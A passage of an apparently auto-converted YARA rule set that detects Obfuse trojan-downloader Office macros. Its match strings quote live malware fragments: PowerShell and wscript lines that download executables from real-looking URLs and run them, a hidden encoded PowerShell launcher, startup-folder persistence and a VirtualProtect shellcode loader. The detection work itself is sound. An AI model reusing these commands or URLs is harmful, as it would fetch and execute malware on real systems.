        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {52 65 70 6c 61 63 65 28 73 64 69 2c 20 22 [0-10] 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {41 70 70 6c 69 63 61 74 69 6f 6e 2e 53 74 61 72 74 75 70 50 61 74 68 20 26 20 54 69 69 6f 6e 52 28 22 [0-10] 5c 2e 2e 5c 2e [0-10] 2e 22 20 26 20 22 [0-10] 5c 2e 2e 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {26 20 54 69 69 6f 6e 52 28 22 6a [0-10] 73 65 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 54 69 69 6f 6e 52 28 22 77 6d [0-10] 69 [0-10] 50 52 4f [0-10] 43 [0-10] 45 53 53 20 63 [0-10] 61 6c 6c 20 63 72 65 [0-10] 61 74 65 20 22 22 77 [0-10] 73 63 [0-10] 72 [0-10] 69 70 74 20 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 54 69 69 6f 6e 52 28 22 [0-10] 52 [0-10] 75 6e 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PO_2147744358_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PO!MTB"
        threat_id = "2147744358"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "ChrW(CLng(((1.55555555555556 * (846 - 765#)" ascii //weight: 1
        $x_1_2 = "wdDialogToolsProtectDocument" ascii //weight: 1
        $x_1_3 = "wdUnderlineThick Xor wdKeyNumericDivide" ascii //weight: 1
        $x_1_4 = "-679 + 679.077497665733" ascii //weight: 1
        $x_1_5 = "201 + wdStyleHyperlinkFollowed" ascii //weight: 1
        $x_1_6 = {47 65 74 4f 62 6a 65 63 74 28 [0-25] 29 2e 53 70 61 77 6e 49 6e 73 74 61 6e 63 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PO_2147744358_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PO!MTB"
        threat_id = "2147744358"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 2e 52 65 67 57 72 69 74 65 20 [0-21] 24 20 26 20 22 41 63 63 65 73 73 56 42 4f 4d 22 2c 20 31 2c 20 22 52 45 47 5f 44 57 4f 52 44 22}  //weight: 1, accuracy: Low
        $x_1_2 = {5c 4d 69 63 72 6f 73 6f 66 74 5c 57 69 6e 64 6f 77 73 5c 53 74 61 72 74 20 4d 65 6e 75 5c 50 72 6f 67 72 61 6d 73 5c 53 74 61 72 74 75 70 5c 22 22 2b 22 20 2b 20 22 [0-21] 22 20 2b 20 22 2b 22 22 2e 65 78 65 22}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 [0-80] 5c 4d 69 63 72 6f 73 6f 66 74 5c 57 69 6e 64 6f 77 73 5c 53 74 61 72 74 20 4d 65 6e 75 5c 50 72 6f 67 72 61 6d 73 5c 53 74 61 72 74 75 70 5c 74 65 6d 70 6c 61 74 65 73 2e 76 62 73 22 2c 20 54 72 75 65 2c 20 54 72 75 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PO_2147744358_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PO!MTB"
        threat_id = "2147744358"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "RtCoolMom = RtCoolMom + 0.00000000105 * Sgn(1.88137155058 + 172402.036444808 * Assitents)" ascii //weight: 1
        $x_1_2 = "WriteLine (\"wscript //nologo c:\\Colorfonts32\\visitcard.vbs https://www.kbtseafood.com/wp-content/uploads/2019/07/JTGUJRDPX.res c:\\Colorfonts32\\pes19.exe\")" ascii //weight: 1
        $x_1_3 = "= L & \"|\" & B & \"|\" & R" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PR_2147744421_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PR!MTB"
        threat_id = "2147744421"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 6f 70 65 6e 28 22 22 47 45 54 22 22 2c 22 22 68 74 74 70 3a 2f 2f [0-32] 2f 63 63 63 2e 6a 73 22 22 2c 66 61 6c 73 65 29 3b 78 6d 6c 2e 73 65 6e 64 28 29 3b}  //weight: 1, accuracy: Low
        $x_1_2 = "Environ(Replace(\"U###SE###RP###ROF###ILE\", \"###\", \"\")) & \"\\\" & Replace(\"D###ow###nl###oa###ds\", \"###\", \"\") & \"\\BusinessLayer.js\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PR_2147744421_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PR!MTB"
        threat_id = "2147744421"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "JO = JO + 0.00001113107 * Atn(5.14987350142 + 3340.6124266998 * J)" ascii //weight: 1
        $x_1_2 = "DeleteFile = \"C:\\programdata\\Worid.bat\"" ascii //weight: 1
        $x_1_3 = ".CreateTextFile(\"C:\\programdata\\Worid.vbs\", True)" ascii //weight: 1
        $x_1_4 = "= L & \"|\" & B & \"|\" & R" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PR_2147744421_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PR!MTB"
        threat_id = "2147744421"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "00110001,00111001,00111000,00101110,00110010,00110011,00101110,00110010,00110101,00110001,00101110,00110001,00110001,00110000,00101111" ascii //weight: 1
        $x_1_2 = "01000110,01101001,01101100,01100101,00101000,00100111,00100111,01101000,01110100,01110100,01110000,00111010,00101111,00101111,00110001,00111001,00111000,00101110,00110010,00110011,00101110,00110010,00110101,00110001,00101110" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PW_2147744483_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PW!MTB"
        threat_id = "2147744483"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "#If Win64 Then" ascii //weight: 1
        $x_1_2 = "Private Declare PtrSafe Function vp Lib \"kernel32\" Alias \"VirtualProtect\" (ByVal x1 As LongPtr," ascii //weight: 1
        $x_1_3 = "s = \"6F\"" ascii //weight: 1
        $x_1_4 = "s = s & \"" ascii //weight: 1
        $x_1_5 = "Val(\"&H\" & Mid(s, k, 2))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PW_2147744483_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PW!MTB"
        threat_id = "2147744483"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_3_1 = "https://sx-facemask.com/wp-content/themes/busify/_Eb-6XZQPkeWFE2F0.php?x=MDAwMSCXfM02CmgQnk-DMmwZ6iqPCFHtzoeaRLfZrzLpiPzvIOSihDhzp9ISW4bpG92mmNuiHQNMEkLVrUmEz6koYzX70xVMGf6jVCqQeRVe7t85UJ6Q_r7oGwyZGzHnKZK1O-jzvCDYaZSg3VuYDRvD" ascii //weight: 3
        $x_1_2 = "= \"wscript.shell" ascii //weight: 1
        $x_1_3 = "powershell -nop -ep bypass -windowstyle hidden -enc " ascii //weight: 1
        $x_1_4 = ".Run$ payload" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_1_*))) or
            ((1 of ($x_3_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_PX_2147744498_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PX!MTB"
        threat_id = "2147744498"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Function suckmydickfornoreason11()" ascii //weight: 1
        $x_1_2 = "suckmydickfornoreason6 = \"h\"" ascii //weight: 1
        $x_1_3 = "suckmydickfornoreason9 = \"p://%20%20@j.mp/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PX_2147744498_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PX!MTB"
        threat_id = "2147744498"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 68 65 65 74 73 28 22 [0-20] 22 29 2e 43 65 6c 6c 73 28 [0-16] 29 2e 56 61 6c 75 65 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 20 [0-16] 2c 20 [0-16] 2c 20 [0-16] 2c 20 4e 75 6c 6c}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 31 20 54 6f 20 4c 65 6e 28 [0-32] 29 20 53 74 65 70 20 32}  //weight: 1, accuracy: Low
        $x_1_4 = {26 20 43 68 72 28 43 4c 6e 67 28 [0-32] 20 26 20 4d 69 64 28 [0-32] 2c 20 [0-32] 29 29 20 2d 20 [0-2] 29 [0-2] 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_5 = "= \"\"" ascii //weight: 1
        $x_1_6 = "= Chr(0" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PY_2147744499_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PY!MTB"
        threat_id = "2147744499"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Dir(RootPath & \"\\22.mp4" ascii //weight: 1
        $x_1_2 = "Path & \"\\calc.dll" ascii //weight: 1
        $x_1_3 = "ShellExecute(\"rund\" & \"ll32.exe\"" ascii //weight: 1
        $x_1_4 = "ntgs) & \"Loc\" & \"al\\Te\" & \"mp\"" ascii //weight: 1
        $x_1_5 = "fso.GetFolder(RootPath)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PY_2147744499_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PY!MTB"
        threat_id = "2147744499"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 22 [0-20] 22 29 2e 56 61 6c 75 65 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 20 [0-16] 2c 20 [0-48] 2c 20 4e 75 6c 6c}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 31 20 54 6f 20 4c 65 6e 28 [0-32] 29 20 53 74 65 70 20 32}  //weight: 1, accuracy: Low
        $x_1_4 = {26 20 43 68 72 28 43 4c 6e 67 28 [0-32] 20 26 20 4d 69 64 28 [0-32] 2c 20 [0-32] 29 29 20 2d 20 [0-2] 29 [0-104] 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_5 = "= \"\"" ascii //weight: 1
        $x_1_6 = "= Chr(0" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PY_2147744499_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PY!MTB"
        threat_id = "2147744499"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "High"
    strings:
        $x_6_1 = "68 74 74 70 3A 2F 2F 62 65 73 74 61 74 6D 65 64 69 61 2E 63 6F 6D 2F 69 67 66 78 73 72 76 63 2E 65 78 65" ascii //weight: 6
        $x_1_2 = "57 53 63 72 69 70 74 2e 53 68 65 6c 6c" ascii //weight: 1
        $x_1_3 = ".send" ascii //weight: 1
        $x_1_4 = ".responseBody" ascii //weight: 1
        $x_1_5 = ".savetofile" ascii //weight: 1
        $x_1_6 = ".Run" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PZ_2147744500_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PZ!MTB"
        threat_id = "2147744500"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 75 62 20 [0-16] 28 [0-16] 2c 20 4f 70 74 69 6f 6e 61 6c 20 42 79 56 61 6c 20 [0-16] 20 41 73 20 53 74 72 69 6e 67 20 3d 20 22 63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c [0-16] 2e 70 64 66 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2b 20 22 73 76 72 33 32 20 63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c [0-16] 2e 70 64 66 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PZ_2147744500_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PZ!MTB"
        threat_id = "2147744500"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 20 [0-64] 2c 20 [0-64] 2c 20 [0-66] 2c 20 4e 75 6c 6c}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 31 20 54 6f 20 4c 65 6e 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 22 [0-20] 22 29 2e 56 61 6c 75 65 29 20 53 74 65 70 20 32}  //weight: 1, accuracy: Low
        $x_1_3 = {26 20 4d 69 64 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 22 [0-20] 22 29 2e 56 61 6c 75 65 2c 20 [0-64] 2c 20 [0-2] 29 29 20 2d 20 [0-2] 29 [0-2] 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_4 = "= \"\"" ascii //weight: 1
        $x_1_5 = "= Chr(Int(0" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_UA_2147744511_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.UA!MTB"
        threat_id = "2147744511"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "new-objec\" & \"t\" & \" System.Net.WebClient;$client.DownloadFile('http://loisnfernandez.us/Gold/aafile.exe','\" & \"%\" & \"temp\" & \"%\" & \"\\uqfeba.exe')" ascii //weight: 1
        $x_1_2 = "start \" & \"%\" & \"temp\" & \"%\" & \"\\uqfeba.exe\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_UA_2147744511_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.UA!MTB"
        threat_id = "2147744511"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".FileExists(afedbbdecbcca + '/' + 'ebbabcbefeb.txt')" ascii //weight: 1
        $x_1_2 = "isFinite(eadabaccfddfbc)" ascii //weight: 1
        $x_1_3 = "WScript.Quit()" ascii //weight: 1
        $x_1_4 = "eval(ffceceabafdbeb)" ascii //weight: 1
        $x_1_5 = ".join('').replace('/*','')" ascii //weight: 1
        $x_1_6 = "Kill CStr(eacffadeebccfebfceedbbaaafabacfceda_dcecedabbcbfaaa_ddaaefcacbdfbdebcfdfbeccececcafdcb())" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_QC_2147744542_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.QC!MTB"
        threat_id = "2147744542"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 68 65 65 74 73 28 22 [0-20] 22 29 2e 43 65 6c 6c 73 28 [0-20] 29 2e 56 61 6c 75 65 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 20 [0-20] 2c 20 [0-48] 2c 20 4e 75 6c 6c}  //weight: 1, accuracy: Low
        $x_1_3 = {26 20 43 68 72 28 43 4c 6e 67 28 [0-20] 20 26 20 4d 69 64 28 [0-20] 2c 20 [0-24] 29 29 20 2d 20 [0-2] 29 [0-66] 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 31 20 54 6f 20 4c 65 6e 28 [0-20] 29 20 53 74 65 70 20 32}  //weight: 1, accuracy: Low
        $x_1_5 = "= \"\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JRL_2147744674_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JRL!MTB"
        threat_id = "2147744674"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 68 72 28 49 6e 74 28 [0-2] 20 2d 20 [0-2] 20 2d 20 [0-2] 20 2d 20 [0-2] 20 2b 20 [0-2] 20 2b 20 49 6e 74 28 [0-2] 20 2f 20 [0-2] 29 20 2b 20 [0-2] 29 29 20 26 20 43 68 72 28 49 6e 74 28 [0-2] 20 2d 20 [0-2] 20 2d 20 [0-2] 20 2b 20 [0-2] 20 2b 20 [0-2] 20 2b 20 [0-2] 20 2d 20 [0-2] 20 2b 20 49 6e 74 28 [0-2] 20 2f 20 [0-2] 29 20 2b 20 49 6e 74 28 [0-2] 20 2f 20 [0-2] 29 20 2b 20 [0-2] 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {43 68 72 28 43 4c 6e 67 28 [0-69] 20 26 20 4d 69 64 28 22 [0-69] 22 2c 20 [0-69] 2c 20 32 29 29 20 2d 20 [0-2] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {47 65 74 4f 62 6a 65 63 74 28 [0-69] 29 2e 47 65 74 28 [0-69] 29 2e 53 70 61 77 6e 49 6e 73 74 61 6e 63 65 5f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_QK_2147744684_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.QK!MTB"
        threat_id = "2147744684"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 6e 65 77 2d 6f 62 6a 65 63 22 20 26 20 22 74 22 20 26 20 22 20 53 79 73 74 65 6d 2e 4e 65 74 2e 57 65 62 43 6c 69 65 6e 74 3b 24 63 6c 69 65 6e 74 2e 44 6f 77 6e 6c 6f 61 64 46 69 6c 65 28 27 68 74 74 70 73 3a 2f 2f 69 6e 65 73 2d 61 72 6e 73 68 6f 66 66 2e 64 65 2f [0-24] 2e 65 78 65 27 2c 27 22 20 26 20 22 25 22 20 26 20 22 74 65 6d 70 22 20 26 20 22 25 22 20 26}  //weight: 1, accuracy: Low
        $x_1_2 = {73 74 61 72 74 20 22 20 26 20 22 25 22 20 26 20 22 74 65 6d 70 22 20 26 20 22 25 22 20 26 20 22 5c [0-16] 2e 70 69 66 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_QM_2147744706_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.QM!MTB"
        threat_id = "2147744706"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "libstrore = libstrore + 0.1110765978 * Tan(3.96205090194 + 213.299095438 * T)" ascii //weight: 1
        $x_1_2 = "SettingAttr.WriteLine (\"start c:\\Resources\\REDclif.exe\")" ascii //weight: 1
        $x_1_3 = "(myUserForm1.Phone2.Caption)" ascii //weight: 1
        $x_1_4 = "= L & \"|\" & B & \"|\" & R" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_QN_2147744734_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.QN!MTB"
        threat_id = "2147744734"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 68 65 65 74 73 28 22 [0-20] 22 29 2e 43 65 6c 6c 73 28 [0-20] 29 2e 56 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_2 = "= Chr(0" ascii //weight: 1
        $x_1_3 = {3d 20 32 20 54 6f 20 4c 65 6e 28 [0-24] 29 20 53 74 65 70 20 32}  //weight: 1, accuracy: Low
        $x_1_4 = {26 20 43 68 72 28 [0-20] 29 [0-66] 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_5 = {26 20 52 69 67 68 74 28 4c 65 66 74 28 [0-20] 2c 20 [0-20] 29 2c 20 32 29}  //weight: 1, accuracy: Low
        $x_1_6 = {53 68 65 6c 6c 20 [0-20] 28 [0-1] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_QO_2147744740_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.QO!MTB"
        threat_id = "2147744740"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"tmp\"" ascii //weight: 1
        $x_1_2 = "= \"p://1\"" ascii //weight: 1
        $x_1_3 = "= \"m32.ex\"" ascii //weight: 1
        $x_1_4 = "= \"81.\"" ascii //weight: 1
        $x_1_5 = "= \"get\"" ascii //weight: 1
        $x_1_6 = "= \"\\zc\"" ascii //weight: 1
        $x_1_7 = "= \"\"" ascii //weight: 1
        $x_1_8 = {53 68 65 6c 6c 20 [0-16] 20 26}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_QP_2147744767_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.QP!MTB"
        threat_id = "2147744767"
        type = "TrojanDownloader"
